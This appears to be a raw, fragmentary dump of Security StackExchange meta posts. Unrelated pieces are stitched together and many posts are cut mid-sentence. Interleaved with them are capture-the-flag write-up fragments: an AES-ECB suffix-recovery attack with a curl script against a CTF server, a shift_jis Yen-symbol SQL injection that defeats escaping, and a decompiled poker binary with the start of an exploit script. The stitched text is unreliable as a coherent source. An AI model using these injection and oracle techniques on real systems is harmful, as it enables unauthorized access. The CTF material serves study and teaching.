29-41           4       yes
42-44           4       no
</code></pre>

<p>I started with the following shell script. Later I used the <code>show</code> command of the Python script below.</p>



<pre><code>#!/bin/bash
# TODO: escape special characters properly
for x do
  curl -s -b cookies.txt -D - http://fridge.insomnihack.ch/food/ \
       -d 'csrfmiddlewaretoken=0j12lGgcA3nXrbXfK5FOaeRUUZZlN56w&amp;submit=Search&amp;term='""$x"" |
  sed -n -e ""s~^Location: /search/~~"" -e T -e ""s~/\\r\$~ $x~"" -e p
done
</code></pre>

<p>If we repeat a 16-byte string in the query, except for the first few and first last bytes, we get a repeated block. This very strongly suggests that those bytes are the result of encrypting a string containing the query with AES-ECB, i.e. the plaintext is <code>prefix + query + suffix</code>. On a 10-byte query for food, changing any of the first 9 bytes affects the first output block, while changing the 10th affects the second block, so the constant prefix must be 7 bytes long. The length of the suffix depends on the padding mode; assuming PKCS#7 padding, where the padding is 1–16 bytes, the suffix is 12 bytes long. The search for users is similar, with the same prefix but a different suffix of length 10.</p>

<p>If we arrange for the suffix to be aligned so that its only last byte is in the last block, there are only 256 possible plaintexts for that last block. Given that the encryption of a block in ECB depends only on its plaintext, we can try all possible 256 blocks consisting of one byte plus its PKCS#7 padding. One of these blocks will match the last block, telling us what the last byte is. Then we can repeat the query with the last two bytes of the suffix in the last block, using the known last byte and varying the next-to-last byte, and so on until we have the whole suffix. The command <code>find_suffixes</code> of the Python script below does this job. The suffix turns out to be <code>|type=object</code> for food and <code>|type=user</code> for users.</p>

<p>This technique won't work to find the prefix. But we can verify guesses by submitting a query like <code>aaaaaaaaa1234567aaaaaaaaa</code> where <code>1234567</code>. The prefix turns out to be my first guess: <code>search=</code>.</p>

<p>In a last exploit of ECB, we can now find the ciphertext for an arbitrary search operation. Just find the relocation URL for <code>aaaaaaaaa + pkcs7_pad(string) + sss</code> and discard the first and last blocks. This enables us to craft queries that don't match the expected format, which will hopefully prove useful. The Python script below packs that into the <code>search</code> command.</p>

<pre><code>$ ./search.py search ""search=|type=bobby'tables""
…
    &lt;div class=""panel-body""&gt;
     Something went horribly wrong, what are you doing to me?? 
        &lt;p&gt; Error : unrecognized token: &amp;quot;&amp;#39;tables WHERE description LIKE ?&amp;quot; &lt;/p&gt;
    &lt;/div&gt;

<p>Why? Ignorance and denial as far as I can tell. Very slowly StackExchange developers have been moving towards enabling https, but after a short spurt of development it seems to have stopped again.

StackExchange is the only site I frequent that does not support https.</p>

<p>If you type https in the address bar manually, it seems to accept that now. I hadn't noticed this yet, in the past it'd redirect you back to insecure http unless you were on the login page, and right now it still has mixed content issues. Ugh. It really isn't that difficult.</p>

<p>Typing https manually works if you're logged in (if not, after logging in it will kick you back to http so there goes your session, no matter what you do), but the DNS lookups reveal which site you're using and someone could easily inject a request in your browser (when you use, say, a news website over plain http) to the insecure version to grab your session cookie.</p>

<p>TL;DR: ignorance from the developers regarding session cookies over http. I guess they're waiting for a high-profile case to happen. I've had this happen around 2009 on a different site to my admin account, so that was the lesson for me.</p>

2166,2,2016-01-25T17:20:32.997,2,,"<p>I've found no technical answer for this, so my best guess is that the answer lies somewhere else.</p>

<p>My observations are that the counter now takes into account all review queues from everybody, and pop-ups only when a certain threshold (most probably defined on a per-site basis, each site having different loads, the threshold appearing to be currently set to 3 reviews on Security SE), leading to these notable effects:</p>

<ul>
<li>The counter may be present while I have myself no pending review in any queue,</li>
<li>The counter may be absent while I have some pending reviews (total number of pending reviews &lt; threshold).</li>
</ul>

<p>Here is how I understand this now:</p>

<ul>
<li>While the user is below 2K, there is no such indicator (even though starting from 500 a user already has access to a few review queues). At this stage the new user user should focus on understanding how SE works and what defines a good post on the current site.</li>
<li>This counter first appears when the user reaches 2K. He has gained more experience, this counter will notify him about the status of his own <em>Suggested Edits</em> queue. This is a way to encourage the user to familiarize himself with the reviewing process.</li>
<li>Starting from 10K, the counter keeps the same visual look but as I saw his meaning is completely changed. Having gained some experience, the user is given a more management-like role (as can be understood from the <a href=""https://security.stackexchange.com/help/privileges/moderator-tools"">10K privilege lecture</a>: ""<em>we're counting on you to guide the community and lead by example</em>"").<br>
Such user should:

<ul>
<li>Not focus on individual review tasks but instead delegate this to lower rep users so they can evolve,</li>
<li>Just ensure that the reviews queues remain manageable, that's why he is only alerted when the queues as a whole go beyond some threshold so he can act accordingly (take a part in the review process, or in the worst case invite other established users to give a hand).</li>

2176,2,2016-02-04T13:45:54.860,48,,"<p>Google-searching is a rarefying skill. It seems to be a question of generation. Let me put some historical context.</p>

<p>In days of my youth (say, 25 years ago, in the late 1980s and early 1990s), when you wanted to learn about something, you went to the public library and looked it up in an encyclopaedia. You also scanned the books on display to see if there was one about your research subject. If you wanted more data you had to invest time and money to order specialized books in a bookshop. All this learning was very active.</p>

<p>Then, from the mid-1990s onward, the Web began to grow and accumulate data, and search engines appeared (remember Altavista ?). People who were used to the library-searching began to use search engines in about the same way: to locate and pinpoint sought-after information.</p>

<p>In the early 2000s (2001, to be precise), Wikipedia appeared and the searching process began to change. The aggregation of information in Wikipedia meant that it became a relatively natural entry point. If you wanted to learn about a subject, you began by reading the Wikipedia article, and possibly followed some of the internal and external links; there is little googling involved in such a process. This also forced search engines to somehow change their stance: while in 1995 you wanted to learn who was the 6th emperor of the Qing dynasty(*), in 2005 you go to Google to know when the nearest restaurant opens. This is still information, but not the same usage context.</p>

<p>Then social networks appeared. They completely reversed the way people use the Internet. This is especially apparent in young people (say, 20 years old or less), who spend inordinate amounts of time connected to Facebook and its ilk. They use the Internet not by going forth and exploring the information jungle with the help of search engines or even Wikipedia; they simple <em>receive</em> a lot of the stuff from their extended network of relations. A youth who grew up to the Internet through social networks has hundreds of Internet-friends, and has barely enough time to simply sift through all the data that they push unto him. For him, Google-searching is an almost alien concept. When he really wants to learn about a specific subject, he asks: he pushes a message so that his Internet-friends, not an anonymous robot like Google, gives him the answer.</p>

<p>Different site, same people: when social network users come to StackExchange, they keep their Internet usage habits: they don't look things up in Google; they ask. Many do not even look up <em>other questions</em> in StackExchange, which is why there are many duplicates.</p>

<p>The amazing thing is how fast this transformation occurred: in two decades, search engines transitioned from ""bleeding edge technology"" to ""tool for dinosaurs"".</p>

<p>(Of course I am talking generalities here; there are still people who use search engines, and even people who go to public libraries. And there are good reasons to ask questions as well. But my point is that the googling reflex is not as widespread as it used to be.)</p>

<p><em>""is this algorithm secure?""</em></p>

<p><em>""I'm writing an application which will store data on disk for an e-commerce website which processes financial transactions. I want to encrypt my data to protect it in the event that my server is compromised, would this algorithm help me achieve that goal""</em></p>

If it's something well-known such as, ""Is md5 secure?"", this is easily answerable without it being too broad.</p>

<p>The problem with my above question about MD5 is that it may give people the wrong idea that it might be a quality question in all cases, leading to some confusion, so I think a better question might be, ""Why shouldn't I use MD5?""</p>

<p>I also like the content of your FAQ blurb, but would lower the language to make it a bit more accessible. Maybe something like:</p>

<blockquote>
  <p>Security is always relative, and depends on the context. A question asking whether or not something ""is secure"" is very hard to answer unless the question includes details about 1) the system or process you are trying to secure 2) the kind of attacker you are trying to protect against. For example, protecting a server against remote access is one thing, but protecting it against a rogue admin is an entirely different question. Please ensure that this information is included, otherwise your question may end up being closed as too broad.</p>

<p>The other point worth making is that we have both experts and non-experts on this site. We get a lot of first-time posters here who are fishing for entry-level information, and I think that should be encouraged. In that case, ""Is it secure to enable [setting X] on my home router?"" seems like a perfectly fine question. Pressing them for a threat model will not be productive, nor will it encourage them to come back.</p>

  narrowly focused on the code presented within the question that they
  answered, but rarely describing the principles and tools of
  de-obfuscation that would make for a useful canonical answer. New
  questions rarely receive solid canonical efforts because posters know
  that there are already many answers out there; old excellent answers
  get lost in the shuffle among so many of the same type of questions.
  People are going to keep coming with this question, and others like it
  - we can't pre-educate newcomers all that well. How can we handle it to both meet their needs and lower the repetitive investment of ""good
  enough here and now"" answers?</p>

<p>Just before the election, we were getting a lot of code snippets being submitted, and the general response from the community was to close as off-topic, but it was an open question (hence an election topic).</p>

<p>You are correct in bringing this to the fore. Let's come to a decision.  </p>

<p>My understanding is that questions need to have some relevance outside the single person asking. Unless there is a way to do that, individual code snippets are off-topic. </p>

<ol>
<li><strong>What should I google?</strong><br> If you don't know the correct terminology, you will not get the right result.<br>
<em>Example:</em> You want to know how the webpages you visit are encrypted, it might be hard if you don't know you should google HTTPS.</li>

You might end up on a technical page or a documentation way above your level, so you cant understand any of the results. If there only was somewhere you could ask for an explanation and ask follow up questions...<br>
<em>Example:</em> On your quest to understand if the webpages you recieve over the web are encrypted, you end up trying to read the <a href=""https://tools.ietf.org/html/rfc5246"" rel=""nofollow"">TLS standard</a>, without understanding a word.</li>
<li><strong>What results should I trust?</strong><br>
You get loads of results, and they seem to contradict each other. There might not be an actual contradiction, but you don't know enough to tell the difference. Better to ask someone with a nice profile picture and loads of magical internet points - they would never lie to you. 
<br><em>Example:</em> One page says that ""the web is inherently insecure"" and another says ""HTTPS makes the web safe"". What is true?</li>

2197,2,2016-02-16T18:46:58.233,10,,"<p>Far as I can tell, there are plenty of good reasons to permit these questions:</p>

<ul>
<li>They're objective and on-topic by the current criteria. SE is intended to be the place to go to answers to objective, on-topic questions.</li>
<li>There's no other place on SE on-topic for these questions (codereview is NOT IT!). </li>
<li>There's arguably no other trustworthy place outside of SE to direct askers of those questions.</li>
<li>It is unhelpful to lock questions without being able to give either a reason for locking, nor an alternative venue for those questions.</li>
<li>There is no requirement that a question be applicable to anyone else. Almost no questions on codereview.SE are: this does not make codereview a bad SE.</li>
<li>Attack code inserted in one site is likely to be inserted into other sites too.</li>
<li>Even attack code inserted in only one site may be of interest to security researchers here.</li>
<li>Those who don't like this class of questions are not required to answer them.</li>
<li>Those who feel this class of questions has some common approaches can create a common ""inserted obfuscated PHP"" question and link it in a comment to these questions.</li>
<li>If lots of security.SE users are asking and answering this kind of question, that suggests a lot of interest in this kind of question in security.SE.</li>
<li>It's clear from comments in the example questions linked, that security.SE users are enjoying posting answers to these questions, and are irked when they are locked.</li>
</ul>

<p>These are all fairly weak arguments. None is crushingly definitive. Most are arguable. Some are likely false.</p>

<p>However, they seem relatively strong compared to the reasons against permitting these questions:</p>

<ul>
<li>Apparently some people are bored by this class of question, feel that too many people want to know more about it, and wish that those people would all stop being curious and just go away instead.</li>
<li>They're off-topic of the spirit of security.se, so the on-topic criteria should be changed to reflect that.</li>
<li>""the general response from the community was to close as off-topic"".</li>

2206,2,2016-02-22T16:05:23.010,5,,"<p>Your question is indeed valid - most people either misuse the tags, or misunderstand the concept completely.   </p>

<p>Usually, you should prefer existing tags, where it makes sense. Rarely, a new topic surfaces, and it makes sense to create a new tag that was not used before. It is rather ambiguous to give you a complete guideline, but it's kinda like ""I'll know it when I see it"" - it really just comes after being familiar with the existing tags, and how they are used. </p>

<p>I would suggesting looking at some tagging posts here on meta, and on Meta.SE for the philosophy of tags... A common mistake is to use ""meta"" tags, i.e. tags that describe the <em>question</em>, instead of the topic being asked. Another mistake is using tags to add information that is not present in the question as asked, or using tags to make the question ""special"".<br>
(Ideal usage of tags is categorization and search optimization, nothing else). </p>

<p>Now, in your specific case - at first reading, I thought the question really WAS about the use of the plugin, and not specifically about images or whatnot. But both existing answers seem to have thought otherwise... So basically, I would say that without any tags, the question is definitely unclear, and needs to be clarified by the OP.<br>
The fact that the OP tagged it with ""plugins"" seems to hint in my direction, BUT that is a misuse of the tag, and I would choose not to rely on it. Regardless, there is obviously missing information, and as such I do not actually know how it should be tagged. </p>

<p>(P.S. in the future, please try not to edit a question just between acceptable spellings, ""plug-in"" is just as valid, as are British spellings ;-) )</p>

<p><a href=""https://law.stackexchange.com/questions/7544/are-ransomware-infections-considered-full-private-data-breaches"">https://law.stackexchange.com/questions/7544/are-ransomware-infections-considered-full-private-data-breaches</a></p>

<p>reasoning:</p>

<ol>
<li>Sometimes the fields overlap.  I'm more likely to get an answer from a security person here who has dealt with this situation.  I kinda already know the legal answer.  But I'm not interested in what a lawyer would say about it.</li>
<li>the question is about a situation that someone in a position of working in security might find themselves: ""a laptop has ransomware!  should I report it to legal? or just re-image it?""</li>
<li>The answer is likely to resonate with security people who are caught in a murky area of ""we are keeping this a secret""  So, it might not make it to legal.</li>
<li>the root of the question is about security. malware. infection. data exposure.  I think we should be allowed to post related legalese to a question without it being sorted.</li>
<li>My central question is ""where are the disclosures"" and I am more interested in the answers that security people would give than what lawyers would say.</li>
</ol>

<p>A good analogy could be:  I'm a doctor.  A doctor I know in another hospital had a bad experience with some equipment and his patient died.  If I say, ""are you warning people about this equipment?"" and he says ""ask a lawyer"", then I'd be hurt.</p>

<p>I think that it fell victim to a destructive sorting instinct and that it was sorted without a chance for discussion or editing. </p>

<p>Yes, there certainly are areas of overlap, I agree.  But to wit, your question specifically asks about legal responsibility, and references both a previous court case and several laws.   It's hard to see any overlap here at all.  This is a legal question. </p>

2233,2,2016-03-03T22:01:16.167,7,,"<p>The question, as currently worded, is most definitely a legal issue. Even if it were not, it falls very close to being close-worthy as ""too broad"" or ""primarily opinion-based"" anyway. So, it's probably better that it got migrated than just shut down.</p>

<p>Here, you have a security incident where a certain amount of impact has been assessed. (In this case, some files being encrypted by unauthorized code running on the system.) It is very possible, perhaps even likely, that the incident's actual impact is greater than what has been assessed - and, depending on the resources available to the assessors, greater than what <em>can</em> be assessed in the absence of a public disclosure from the attackers or their clients. (In this case, the files could possibly have be exfiltrated and the affected organizations may not have the logging/monitoring tools needed to recognize this.)</p>

<p>If you had asked how the security team should react, in terms of recovery &amp; reconstitution, mitigating the vulnerabilities that were exploited to cause the scenario, or restoring the system to a secure state, then it would be closer to on-topic for IT Security. It's still a bit subjective as to whether or not it would be appropriate, in any given situation, to treat the incident as if it had higher impact than what can actually be seen. But at least it would be more on-topic.</p>

<p>Instead, your question is about how the security team is or should be required to report this. And that is very much a legal matter, subject to corporate policies and local laws. You're even specifically citing references to U.S. federal and California state laws. While security experts may often conduct work affected by these, and are frequently even called to testify regarding them, the best people to offer reliable advice on any subject pertaining to law are experienced lawyers. Always. Without exception.</p>

<p>Let's generalize this a bit, to another possible scenario. Instead of having files encrypted, let's say the system just started to suddenly get ads for porn or gambling sites popping up on its screen randomly. There's obviously something unauthorized running on the system, and (absent certain monitoring/logging capabilities) we can't really be sure what else it might be doing.</p>

<p>A question like this might be acceptable here: ""I got infected with some malware that did ABC. Antivirus detected it as XYZ. I think I got it all out, since the bad behavior stopped and I don't see file foobar.exe or any registry entries with bazquxnorf in them anymore. Should I return the system to production, or are there other measures I should take to lock it down and ensure it is clean?"" </p>

<p>It would be a fair bit subjective, and most likely get a bunch of responses like ""nuke from orbit"", ""uninstall Java"", ""upgrade to Linux"", etc. But it would be a bit more on-topic.</p>

<p>However, your question is more like: ""I got infected with some malware that did ABC. I wiped the machine and rebuilt it from a known-good image. Should I report this to legal?""</p>

<p>Even if that didn't get migrated to Law.SE, answers around here would be more like ""it depends on [long list of factors that we don't know the answer to]"", or ""you need to check your company's policy"", etc. So, it would still end up closed here as too broad or primarily opinion-based.</p>

I don't really agree with it, but the consensus is: yes, it's an anti-pattern. The answers there can likely help you.</p>

<p>Regarding your concrete question: </p>

<p>First of, it's really two questions: </p>

<ul>
<li>how can I determine the security of a product</li>
<li>what is the security of specific product X</li>
</ul>

<p>The problem with the second question is that it is hard to answer if taken exactly as phrased. The reasoning goes: How should we know if it's secure? You can't really proof the security of a complex software. </p>

<p>Of course, your question could also be interpreted differently: Are there known vulnerabilities in software X or have there been uncustomarily many vulnerabilities in the past? Has there been a code audit? Is software X build by security professionals? etc. If you mention these questions explicitly in your post, it might be easier for some to answer it (although as you also asked how to determine the security of a product, you might not know that this might be questions you want the answer to). </p>

<p>You could also put a different focus on your question, eg by asking if ""military grade"" has any real meaning or is only a marketing term, if it makes sense to use aes256 in this situation, etc.</p>

<li>The statements are being loosely prepared (string being created and variables added after)</li>
<li>The encoding for the back end script with shift_jis</li>
</ol>

<p>What does this tell us?</p>

<p>This tells us that we will not be able to use an overly simplistic injection attack (using special characters such as "" / ' and so on).</p>

<pre><code>MYSQL_SPECIAL_CHARS = [ 
(""\\"", ""\\\\""), 
(""\0"", ""\\0""), 
(""\n"", ""\\n""), 
(""\r"", ""\\r""), 
(""'"", ""\\'""), 
('""', '\\""'), 
(""\x1a"", ""\\Z""), 
] 
def mysql_escape(s): 
for find, replace in MYSQL_SPECIAL_CHARS: 
s = s.replace(find, replace) 
return s
</code></pre>

<p>The only way to connect to the back end is the web socket so we will need to find away to call this socket directly (without the slow user interface and user experience getting in our way).</p>

<p>Solution:</p>

<p>After much thought, it was concluded the best form of attack would be MySQL injection but taking the approach of exploiting character encodings.</p>

<p>after much research, trial and error a usable encoding was found, we used a Japanese Yen symbol. taken from : <a href=""https://www.ipa.go.jp/files/000017321.pdf"" rel=""nofollow noreferrer"">https://www.ipa.go.jp/files/000017321.pdf</a></p>

<p>The Japanese Yen symbol when processed by a SQL statement in hand with the shift_jis encoding is first handled as 00A5 (the symbol its self ¥ = 00A5) while a backslash \ is 005C when converted to shift_jis the Yen symbol becomes 5C thus logically becoming a slash and escaping the sql statement.</p>

<p>from the image you see below you can notice our final solution discovered by @hamza to capture the Flag.</p>

2251,2,2016-03-14T22:38:48.723,8,,"<p>I think there are many qualitative differences between your Splikity question and the referenced Telegram question.</p>

<p>Before going into specifics, let's keep in mind the tooltip that is displayed when you mouse over the down arrow for a question in the web app:</p>

<blockquote>
  <p>This question does not show any research effort; it is unclear or not useful</p>
</blockquote>

<p>When I look at your question, the first thing I notice is that you reference a relatively unknown service and don't provide any links. That means that everyone who is to respond will need to do a search themselves. Compare this to the Telegram question that is full of links to the products main sites as well as to specific documentation links. I feel this both shows strong research on the Telegram OP's part, as well as makes the Telegram posting more useful to future viewers.</p>

<p>Your question of ""Is Splikity actually secure?"" turns out to be really hard to answer. If you look through the main site, you'll see tons of comments asking questions like ""Secure for what?"" and ""What is your threat model?"" We just don't know how to evaluate such a question. On the other hand, the Telegram question asks ""Is Telegram more secure than WhatsApp?"". So the possible answers are ""Yes"", ""No"", and ""Telegram is more secure in terms of A, B, C while WhatsApp is more secure in terms of X, Y, Z."" IMO, that makes it a clear question.</p>

<p>Note that I do not think that the number of votes on the two questions is an indication of their relative quality. That's largely due to the popularity of the WhatsApp app (the WhatsApp question has nearly 1000 times more views than the Splikity one) as well as details about how StackExchange sites work (eg: @tim's guess about it becoming a ""hot"" question).</p>

<p>I used <a href=""https://retdec.com/decompilation/"" rel=""nofollow noreferrer"">retdec</a> to get some juicy info about the source:</p>



<pre><code>int main(int argc, char ** argv) {
    char * mem = malloc(46); // 0x80485ae
    int32_t v1 = (int32_t)mem; // 0x80485bc
    strcpy(mem, ""Welcome to Randy's TinyPoker! DebugInfo: AAAA\n"");
    srand(time(NULL));
    uint32_t v2 = rand(); // 0x80485f6
    char * v3 = (char *)(v1 + 41); // 0x8048601_0
    *v3 = (char)((int32_t)*v3 + v2 / 0x1000000);
    char * v4 = (char *)(v1 + 42); // 0x804861e_0
    *v4 = (char)((int32_t)*v4 + v2 / 0x10000);
    char * v5 = (char *)(v1 + 43); // 0x804863b_0
    *v5 = (char)((int32_t)*v5 + v2 / 256);
    char * v6 = (char *)(v1 + 44); // 0x8048658_0
    *v6 = (char)((int32_t)*v6 + v2);
    printf(mem);
    printf(""We've dealt you your hand face down, please enter it:\n"");
    int32_t str;
    memset((char *)&amp;str, 0, 5);
    int32_t stream = g1;
    fgets((char *)&amp;str, 5, (struct struct__IO_FILE *)&amp;stream);
    if (str == v2) {
        printf(""You guessed that hand perfectly! Here's your prize: flag-here\n"");
    } else {
        printf(""Sorry, wrong hand, try again!\n"");
    }
    return 0;
}
</code></pre>

<p>So basically <code>v1</code> points to a string in memory <code>Welcome to Randy's TinyPoker! DebugInfo: AAAA\n</code>, <code>v2</code> is some random number and <code>v3</code>, <code>v4</code>, <code>v5</code>, <code>v6</code> all point to the debug info part (AAAA initially).</p>

<p>Then it proceeds to add a <em>part</em> of the random number to each of <code>v3</code>, <code>v4</code>, <code>v5</code>, <code>v6</code> by dividing v2 first:</p>

<pre><code>*v3 = (char)((int32_t)*v3 + v2 / 0x1000000); // v3 = v3 + (v2 / 2^24)
*v4 = (char)((int32_t)*v4 + v2 / 0x10000);   // v4 = v4 + (v4 / 2^16) 
*v5 = (char)((int32_t)*v5 + v2 / 256);       // v5 = v5 + (v5 / 2^8)
*v6 = (char)((int32_t)*v6 + v2);
</code></pre>

<p>At the end, it compares our input with the random generated value <code>str == v2</code>. So in order to guess correctly we need to get the debug info and substract <code>A</code> from each character, pack it and send it!</p>



<pre><code>#!/usr/bin/python3

# Make sure to install pexpect (linux only) - pip install pexpect

2268,2,2016-03-17T22:34:27.687,11,,"<p><strong>Meme:</strong> They can see your dick pics.</p>

<p><strong>Originator:</strong> John Oliver (<em>Last Week Tonight</em>, on HBO)</p>

<p><strong>Cultural Height:</strong> 2015-2016</p>

<p><strong>Background:</strong> In June of 2013, documents stolen from the <a href=""https://en.wikipedia.org/wiki/Nsa"" rel=""nofollow noreferrer"">NSA</a> by <a href=""https://en.wikipedia.org/wiki/Edward_snowden"" rel=""nofollow noreferrer"">Edward Snowden</a> were released to the public. These documents revealed to the layman extensive government surveillance systems which previously were assumed to not actually exist. (Conspiracy theorists have long warned of such systems. While the rest of the general public likely assumed government agencies were capable of designing and employing them, they perhaps equally assumed this had not actually been done or was not being done indiscriminately.)</p>

<p>In April of 2015, laws which enabled the use of these systems were nearly due to be renewed. However, public interest in the topic had largely waned at this point. In an informal survey, <a href=""https://en.wikipedia.org/wiki/John_Oliver_(comedian)"" rel=""nofollow noreferrer"">John Oliver</a> - host of <a href=""https://en.wikipedia.org/wiki/Last_Week_Tonight_with_John_Oliver"" rel=""nofollow noreferrer""><em>Last Week Tonight</em></a>, a news satire show airing on <a href=""https://en.wikipedia.org/wiki/HBO"" rel=""nofollow noreferrer"">HBO</a> - found that nobody could even properly recall who Edward Snowden was.</p>

<p>In order to re-ignite the discussion, and inspire the public to action, it was necessary to find an aspect of the government surveillance programs which the layman could intimately relate to. So, in the same survey, respondents were asked how they would feel if the government had obtained access to pictures of their genitalia - i.e.: ""dick pics"". Of course, the situation was found to be generally undesirable by all.</p>

<p>To bring this into relevance with the discussion of government surveillance, John Oliver traveled to Russia for an interview with Edward Snowden. During the interview, he shared his survey results with Snowden. Then, Oliver proceeded to ask Snowden about the various government surveillance programs which had been brought to light by his leaks. Regarding each, Oliver asked ""Can they see my dick?"".</p>

<p>The full segment is available on <a href=""https://www.youtube.com/watch?v=XEVlyP4_11M&amp;feature=youtu.be&amp;t=24m46s"" rel=""nofollow noreferrer"">YouTube</a>, courtesy of HBO. (Link jumps to the portion where ""dick pics"" are brought into scope.)</p>

<p>This is a fantastic example of how matters of information security can be brought into focus and made relevant to an otherwise ignorant or unconcerned audience. In this case, it was for the general public. However, information security professionals often face similar challenges when having conversations with members of management - especially at higher levels, and with C-level executives.</p>

<p>So, when addressing the level of exposure posed by a certain risk, it may help to ask (or answer) the question: ""Can they see the dick pics?""</p>

<p>Over here on Sec.SE, because there is way less traffic, the problem is not as maddening as on SO, but still a problem we as a community should try and take care of.</p>

<p>In fact, on SO <a href=""//stackoverflow.com/teams/11/socvr"" rel=""nofollow"">there is a ""SOCVR"" team</a> in an attempt to rather improve the question and be helpful to new users, trying to educate them as to how they may get better answers faster.</p>

<p>(Side note: SOCVR do more than just that, but let's focus on the ""help OP""-part right now)</p>

<p>Nontheless, it might be a good approach to</p>

<ul>
<li>leave useful comments when downvoting and/or closevoting (as does schroeder regularly, there is a user script for auto-comments, which makes that easier for recurring problems),</li>
<li><p>have a <a href=""https://chat.stackexchange.com/rooms/37754/sec-se-cvr"">chat room</a> with experienced users who try to explain the problems with questions to OPs in a more direct way, helping to shape the questions in form.</p>

<p>This way, new users may still get ranted away (because, hey, it's still the internet), but there are people to help them understand the problems and tell them to not be giving up on their first shot.</p></li>
</ul>

<p>As I was a room member on SOCVR and I think the idea is pretty good, I just founded and linked the proposed chat room and am happy to have more people there.</p>

<p>While the team on SO has a broader approach to moderation, I'll quote here some parts of their internal rules that may apply here too:</p>

<blockquote>
  <ul>
  <li>Work with the OP to get their post into shape; most content has some value.</li>
  <li>De-escalate in case of disagreement. </li>
  <li>A post is to be actively handled by only one member of the room. (We don't need 4 members all leaving witty statements in the comments or in chat.)</li>
  <li>Moderate the post, not the user. (keep the discussion on the merits of the post, not on behavior of the user)</li>
  </ul>

<p>If you just want to quickly inform the user of a possible solution, post it as a comment. It's not strictly forbidden, it doesn't really do any harm, and if someone really minds, they can still flag it.</p>

<p>If you want to post it as an answer, it has to be an actual answer by you (so just copy-pasting from the link would also not be ok). You could summarize the linked content, eg: </p>

<p>From the algorithmic point of view, the main issue is that new users with low reputations are subjected to more variance in reputation relative to their total reputation than established users.

<p>One could fix the down-voting algorithm so that the impact to new user's reputations causes less variance in their reputations.  For example, use a simple scaling equation, where the time the account has been open is used as a coefficient for how much the down-votes effect reputation, until a certain threshold of time or reputation is passed.</p>

<p>Similarly the voting to close a question can be scaled so that new user questions take proportionally more votes to close.</p>

<blockquote>
  <p>Is this disclosure an example of a conflict of interest?</p>
</blockquote>

<p>This case: <strong>Not really.</strong><br>
The case by case basis is the rule of thumb for this for a reason. This disclosure is showing that the person just writes such types of software and has experience with them. It does not bound into the conflict of interest range since it does not recommend something that is a true interest in benefit to the answer writer. Their answer really only points out one thing, and that is in that doing something wrong is just as bad, if not worse, than doing nothing and that it is really easy to do something wrong. That's not really a conflict of interest, just a statement of experience from such and such place.</p>

<p>The problem comes in that people are miss viewing it and raises a few more questions</p>

<p>The answer to that is a little trickier since I can't see the votes themselves(yet). If this is a bunch of <em>close because of conflict of interest</em>, then maybe it does need to be written in a better manner that shows what a conflict of interest REALLY is.</p>

<p>The issue here doesn't seem to be about whether the asker is an end-user or not, or even their knowledge level, but about the nature of the question. From what I've seen in the year that I've been active, security.SE seems to be most favourable towards questions about security <em>architecture</em>, or the <em>design</em> of secure systems. The most upvoted answers tend to be theoretical / logical, sometimes with a bit of math, or a diagram, or links to further reading. The most upvoted questions are those that prompt this kind of answer, and can come from a variety of askers: programmers, network admins, physical security specialists, human security specialists (aka ""trainers""), or people looking to secure their personal machines / home networks.</p>

<p>I my experience, the point is to encourage users to post questions of the form ""how do I design this with security in mind?"", rather than ""how do I configure software X for security?"". The latter belongs on <a href=""https://superuser.com/"">SuperUser</a> (for end-user software) or <a href=""https://serverfault.com/"">ServerFault</a> (for server software). The end result will probably be that we <em>tend</em> to cater less to end-users, but not because we're specifically excluding them, just by the nature of questions that we like to answer, and those that tend to get very little attention here.</p>

<p>Straight up, ""is it legal\can I get sued?"" is completely off-topic. The flow of logic is simple, and relates to your own answer: ""it depends on the jurisdiction"". We can't possibly begin to answer without knowing the jurisdiction, but then how do we answer properly when we do? </p>

<p>The answer of ""in jurisdiction X, the scope and limitations are Y"" becomes pure legal interpretation. If we want to make it less of a statement of fact, then we would need to point the OP to a legal resource so that they could do the research themselves. </p>

  <p>The author discloses the conflict of interest.</p>
</blockquote>

<p>Disclosure doesn't necessarily make every conflict of interest acceptable. If somebody posts, ""how do I do X"" and somebody answers, ""just buy product Y, disclaimer: I am author of product Y,"" then we would not accept that as a valid answer.</p>

<p>Furthermore, other posters in this thread are talking about this disclosure like its some altruistic attempt at transparency. You really think a criminal cares about the SE rules? My guess is that he discloses his affiliation because it's the only way to support his answer. He can't show any code or point to any documented examples, so instead he says, ""I know because I created it.""</p>

<p>For these two reasons, I assert that the disclosure is totally worthless and should not be considered a mitigating factor in this poor quality answer.</p>

<blockquote>
  <p>This specific malware author is not benefiting from this specific instance.</p>
</blockquote>

<p>He doesn't benefit directly from this one answer, but in the same sense that industry associations lobby for policies beneficial only to their members, this criminal is lobbying for an answer to the question that benefits members of his industry — himself included.</p>

<p>It is <em>clearly</em> in his interest to convince people not to try to defeat  ransomware. Especially if he can convince security experts on this site, then those security experts take that knowledge back to their coworkers, friends, and family.</p>

<p>Could you picture him providing an answer that <em>undermines</em> his business? ""Suspending ransomware is a really good way to mitigate the damage, and I know because the ransomware I wrote is utterly defeated by this tactic!"" Of course he wouldn't say this. He's not going to undermine his own business. Ergo, telling people not to suspend ransomware is a way of supporting his own business.</p>

<blockquote>
  <p>People have the info they need to make an informed decision.</p>

<p>How does this answer inform the reader? It is absurdly brief, provides no explanation, and offers no citations to support its points. <em>It is the shortest of all 8 answers for that question</em>. The next shortest answer is about twice as long, and the average answer is probably 5-10 times as long, which suggests something about the amount of information in this answer.</p>

<blockquote>
  <p>From a technical standpoint, it has validity.</p>
</blockquote>

<p>I see no evidence of this. Many technical questions have an easily verifiable answer, e.g. run some code and see if it works. Answers that are difficult to verify directly <em>should</em> cite some authoritative source (documentation or source code). An opinion-only answer or a ""just trust me"" answer is not a good fit for SE.</p>

<p><a href=""http://www.infoworld.com/article/3043197/security/4-reasons-not-to-pay-up-in-a-ransomware-attack.html"" rel=""nofollow"">According to InfoWorld</a>, there are many instances where paying the ransom simply <strong>doesn't work at all.</strong></p>

<p>In this case, letting ransomware run to completion is exceedingly unlikely to benefit the victim:</p>

<ol>
<li>Files that were not yet encrypted could have been backed up.</li>
<li>Files that were already encrypted were conceivably recoverable under a  number of plausible scenarios (weak encryption, failing to overwrite plaintext, etc.).</li>
<li>A file that is in the process of being encrypted could conceivably be corrupted, but not if the ransomware writes the complete ciphertext before overwriting the plaintext. And if a file is corrupted in this way, the probability that it is an important file is <code># of important files / # of files</code>, which could be a very low probability — much, much lower than the probability that some of the unencrypted files are important.</li>

</blockquote>

